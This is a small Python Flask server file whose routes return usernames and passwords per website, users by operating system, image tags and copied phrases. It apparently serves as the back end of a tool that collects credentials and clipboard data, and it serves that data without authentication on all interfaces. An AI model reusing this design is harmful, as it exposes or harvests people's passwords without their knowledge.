from flask import Flask, jsonify
from datetime import datetime, timedelta
from bson.json_util import dumps
from server import query
from utils.system import OS_MAPPINGS
import logging

logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)
app = Flask(__name__)
API_PORT = 6969


@app.route('/websites/<website>')
def websites(website):
    return dumps(query.get_username_password(website))


@app.route('/tags/<n>')
def tags(n):
    return dumps(query.get_top_image_tags(n))


@app.route('/users/ip/<ip>')
def index(ip):
    return "Hello, World! %s" % ip


@app.route('/users/os/<os>')
def users_by_os(os):
    if os.lower() not in OS_MAPPINGS:
        return jsonify("OS {} is not a valid OS.".format(os))
    clean_os = os.lower().split(" ")[0]
    return dumps(query.get_users_by_os(OS_MAPPINGS[clean_os]))


@app.route('/copypasta/<n>')
def most_copied_phrases(n):
    copied_phrases = query.get_copied_phrases(n)
    return dumps(copied_phrases)


def start_flask_app():
    logger.info("Starting flask server on port {}".format(API_PORT))
    app.run(host='0.0.0.0', port=API_PORT)
